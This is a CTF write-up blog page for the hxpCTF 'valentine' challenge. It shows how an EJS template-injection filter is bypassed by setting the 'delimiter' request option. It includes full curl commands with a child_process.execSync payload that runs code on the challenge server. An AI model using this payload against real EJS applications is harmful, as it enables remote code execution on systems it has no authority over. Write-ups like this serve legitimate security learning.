@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> valentine - hxpCTF 2023 | ./sk4d</title>
+  <link rel = 'canonical' href = 'https://sk4d.tk/posts/valentine-hxpctf2023/'>
+  <meta name="description" content="My name is Rahul Sunder and I am a 20-year-old Web security enthusiast from India. I am a member of [Team bi0s](https://ctftime.org/team/662), India&#39;s top CTF team, where I conduct research on Web security and play CTF&#39;s. I am passionate about staying up-to-date with the latest security tools and techniques and constantly seek new challenges and opportunities to advance my skills. I enjoy participating in CTF competitions and collaborating with other security professionals in my free time.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="valentine - hxpCTF 2023" />
+<meta property="og:description" content="tl;dr
+
+SSTI in the valentine card
+bypass filter by setting ejs delimiter option
+RCE :yay:
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sk4d.tk/posts/valentine-hxpctf2023/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-15T17:30:38+00:00" />
+<meta property="article:modified_time" content="2023-03-15T17:30:38+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="valentine - hxpCTF 2023"/>
+<meta name="twitter:description" content="tl;dr
+
+SSTI in the valentine card
+bypass filter by setting ejs delimiter option
+RCE :yay:
+"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://sk4d.tk/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://sk4d.tk/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://sk4d.tk/posts/scorescope-dicectf-2023/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&text=valentine%20-%20hxpCTF%202023" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&is_video=false&description=valentine%20-%20hxpCTF%202023" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=valentine%20-%20hxpCTF%202023&body=Check out this article: https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&name=valentine%20-%20hxpCTF%202023&description=%3cp%3e%3cstrong%3etl%3bdr%3c%2fstrong%3e%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eSSTI%20in%20the%20valentine%20card%3c%2fli%3e%0a%3cli%3ebypass%20filter%20by%20setting%20ejs%20delimiter%20option%3c%2fli%3e%0a%3cli%3eRCE%20%3ayay%3a%3c%2fli%3e%0a%3c%2ful%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&t=valentine%20-%20hxpCTF%202023" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">intro</a></li>
+    <li><a href="#initial-analysis">Initial analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#payload">Payload</a></li>
+    <li><a href="#closing-thoughts">Closing thoughts</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        valentine - hxpCTF 2023
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-03-15 17:30:38 &#43;0000 UTC" itemprop="datePublished">2023-03-15</time>
+          
+        </div>
+        
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/web">Web</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/hxpctf" rel="tag">hxpCTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><strong>tl;dr</strong></p>
+<ul>
+<li>SSTI in the valentine card</li>
+<li>bypass filter by setting ejs delimiter option</li>
+<li>RCE :yay:</li>
+</ul>
+<p><strong>Challenge Points</strong>: 80
+<strong>No. of solves</strong>: 116
+<strong>Solved by</strong>: <a href="https://twitter.com/RahulSundar8">sk4d</a></p>
+<h2 id="intro">intro</h2>
+<p>I played hxpCTF 2023 last weekend with my team <strong>bi0s</strong>. There a were a lot of awesome web challenges. I have worked on most of the web challenges and this is the write-up for the challenge valentine</p>
+<h2 id="initial-analysis">Initial analysis</h2>
+<p>The application lets us to create a fully customisable valentines card. The application asks us to personalize our card using the <code>&lt;%= name %&gt;</code> tags and it gets replaced with the value in the name parameter we send to the template, this can be seen in the source</p>
+<p><img src="valentine/snip.png" alt="image.png"></p>
+<p>here we can see that our input is passed to the tmpl varible on line number 22 and then on line number 36 , tmpl is written to a ejs template file. This template is later rendered</p>
+<p><img src="valentine/test.png" alt="image.png"></p>
+<p>in line number 60 which results in an ejs SSTI. This looks easy but no :) there is a filter on line number 24 which blocks every templates other than <code>&lt;%= name %&gt;</code></p>
+<p><img src="valentine/filter.png" alt="image.png"></p>
+<p>this filter checks for the occurences of <code>&lt;%</code> in our template and from there takes the next 11 characters and checks if it matches the string <code>&lt;%= name %&gt;</code> and if this check fails the program returns 400. So we basically can&rsquo;t pass anything other than <code>&lt;%= name %&gt;</code> in our template.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>We found this interesting <a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">blog</a> by Eslam Salem which explained an interesting feature in ejs which allows us to overwrite the template options with the request parameters. This happens because ejs merges our parameters with the options object if the options object is empty and our request has valid option names as params
+<a href="https://github.com/mde/ejs/blob/80bf3d7dcc20dffa38686a58b4e0ba70d5cac8a1/lib/utils.js#L135-L143">libs/utils.js:135</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_OPTS_PASSABLE_WITH_DATA</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;delimiter&#39;</span>, <span style="color:#e6db74">&#39;scope&#39;</span>, <span style="color:#e6db74">&#39;context&#39;</span>, <span style="color:#e6db74">&#39;debug&#39;</span>, <span style="color:#e6db74">&#39;compileDebug&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;client&#39;</span>, <span style="color:#e6db74">&#39;_with&#39;</span>, <span style="color:#e6db74">&#39;rmWhitespace&#39;</span>, <span style="color:#e6db74">&#39;strict&#39;</span>, <span style="color:#e6db74">&#39;filename&#39;</span>, <span style="color:#e6db74">&#39;async&#39;</span>];
+</span></span></code></pre></div><p>we can see the option called <code>delimiter</code> which enables us to use custom characters in our ejs tags to make templates, You can read about the different ejs options <a href="https://www.npmjs.com/package/ejs?#:~:text=cache%20Compiled%20functions%20are%20cached%2C%20requires%20filename">here</a>. This is exactly what we were looking for and we can use this feature to bypass the filter in line 24 by setting a custom delimiter like <code>delimiter=?</code> and then we can execute payloads like <code>&lt;?= process.mainModule.require(\'child_process\').execSync(\'/readflag\').toString() ?&gt; </code> to read the flag</p>
+<h2 id="payload">Payload</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">$&#39;Host: localhost:9086&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 99&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://localhost:9086&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: close&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://localhost:9086/&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary <span style="color:#e6db74">$&#39;tmpl=&lt;%=+name+%&gt;&lt;?=+process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;/readflag\&#39;).toString()+?&gt;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#e6db74">$&#39;http://91.107.238.232:9086/template&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;GET&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">$&#39;Host: localhost:9086&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://localhost:9086&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: close&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://localhost:9086/&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#e6db74">$&#39;http://91.107.238.232:9086/f8a6a7de-9649-42b7-a3e9-f216d73a9d6f?name=asdf&amp;delimiter=?&#39;</span>
+</span></span></code></pre></div><p>flag</p>
+<pre tabindex="0"><code>hxp{W1ll_u_b3_my_V4l3nt1ne?}
+</code></pre><h2 id="closing-thoughts">Closing thoughts</h2>
+<p>Thanks to the hxpCTF 2022 <code>-_(0_0)_-</code> organizers. The challenges were fun and we learnt a ton :)</p>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">intro</a></li>
+    <li><a href="#initial-analysis">Initial analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#payload">Payload</a></li>
+    <li><a href="#closing-thoughts">Closing thoughts</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&text=valentine%20-%20hxpCTF%202023" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&is_video=false&description=valentine%20-%20hxpCTF%202023" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=valentine%20-%20hxpCTF%202023&body=Check out this article: https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&title=valentine%20-%20hxpCTF%202023" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&name=valentine%20-%20hxpCTF%202023&description=%3cp%3e%3cstrong%3etl%3bdr%3c%2fstrong%3e%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eSSTI%20in%20the%20valentine%20card%3c%2fli%3e%0a%3cli%3ebypass%20filter%20by%20setting%20ejs%20delimiter%20option%3c%2fli%3e%0a%3cli%3eRCE%20%3ayay%3a%3c%2fli%3e%0a%3c%2ful%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsk4d.tk%2fposts%2fvalentine-hxpctf2023%2f&t=valentine%20-%20hxpCTF%202023" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2023  ./sk4d 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
